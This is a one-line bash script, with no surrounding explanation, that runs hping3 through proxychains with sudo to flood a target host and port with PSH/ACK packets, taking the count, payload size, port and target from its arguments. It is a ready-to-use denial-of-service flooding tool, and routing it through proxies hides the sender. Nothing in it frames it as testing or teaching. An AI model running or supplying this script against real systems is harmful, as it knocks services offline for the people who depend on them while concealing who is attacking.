#!/bin/bash

sudo proxychains hping3 -c "$1" -d "$2" -PA --flood -p "$3" "$4"
